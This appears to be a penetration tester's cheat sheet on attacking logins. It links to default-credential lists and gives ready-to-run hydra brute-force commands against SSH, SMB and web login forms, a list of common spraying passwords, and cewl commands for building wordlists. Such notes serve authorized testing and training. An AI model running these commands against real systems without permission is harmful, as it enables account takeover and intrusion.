#### Default credentials

- Use google : <software> default password or search in documentation
- Test admin, root, hostname of the box, user as password, empty password, default password...
- https://cirt.net/passwords
- https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
- https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
- Source code (if available)
- Stickers on network devices

#### Brute force

- https://book.hacktricks.xyz/brute-force

```
hydra -l admin -P passwords.txt -e nsr ssh://$IP:2222
hydra -L users.txt -p Welcome01 -e nsr smb2://$IP
hydra -l administrator -p admin -M windows_hosts.txt smb
hydra -C creds.txt -M windows_hosts.txt smb
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/path/admin.php:user=^USER^&pass=^PASS^:Incorrect"

hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /path/admin.html
```

#### Password spraying

- Welcome01
- Password1
- Company1!
- Company2024
- Winter2024

#### Wordlist crafting

```
cewl -d 2 -m 8 --with-numbers -w out.txt http://www.website.com/
pw-inspector -h
```

Generate a user name list for brute force from first and last name :

- https://dzmitry-savitski.github.io/2020/04/generate-a-user-name-list-for-brute-force-from-first-and-last-name